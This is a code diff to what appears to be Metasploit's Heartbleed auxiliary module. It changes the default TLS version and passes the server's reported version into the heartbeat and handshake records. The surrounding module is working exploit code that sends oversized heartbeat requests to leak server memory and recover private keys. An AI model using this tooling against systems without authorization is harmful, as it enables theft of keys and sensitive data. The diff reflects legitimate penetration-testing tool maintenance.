@@ -138,7 +138,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
-        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
+        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.2', ['SSLv3','1.0', '1.1', '1.2']]),
         OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
@@ -306,7 +306,7 @@ class Metasploit3 < Msf::Auxiliary
     return if connect_result.nil?
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
+    sock.put(heartbeat(heartbeat_length, connect_result))
     hdr = sock.get_once(5, response_timeout)
     if hdr.blank?
       vprint_error("#{peer} - No Heartbeat response...")
@@ -434,11 +434,11 @@ class Metasploit3 < Msf::Auxiliary
     print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
   end
 
-  def heartbeat(length)
+  def heartbeat(length, tls_version)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
     payload << [length].pack("n") # Payload Length: 65535
 
-    ssl_record(HEARTBEAT_RECORD_TYPE, payload)
+    ssl_record(HEARTBEAT_RECORD_TYPE, tls_version, payload)
   end
 
   def client_hello
@@ -466,11 +466,11 @@ class Metasploit3 < Msf::Auxiliary
     data << [hello_data.length].pack("n")  # Length
     data << hello_data
 
-    ssl_record(HANDSHAKE_RECORD_TYPE, data)
+    ssl_record(HANDSHAKE_RECORD_TYPE, TLS_VERSION[datastore['TLS_VERSION']], data)
   end
 
-  def ssl_record(type, data)
-    record = [type, TLS_VERSION[datastore['TLS_VERSION']], data.length].pack('Cnn')
+  def ssl_record(type, version, data)
+    record = [type, version, data.length].pack('Cnn')
     record << data
   end
 
@@ -531,12 +531,13 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
+    server_hello_unpacked = server_hello.unpack("Cn")
+    unless server_hello_unpacked[0] == HANDSHAKE_RECORD_TYPE
       vprint_error("#{peer} - Server Hello Not Found")
       return nil
     end
 
-    true
+    server_hello_unpacked[1]
   end
 
   def key_from_pqe(p, q, e)
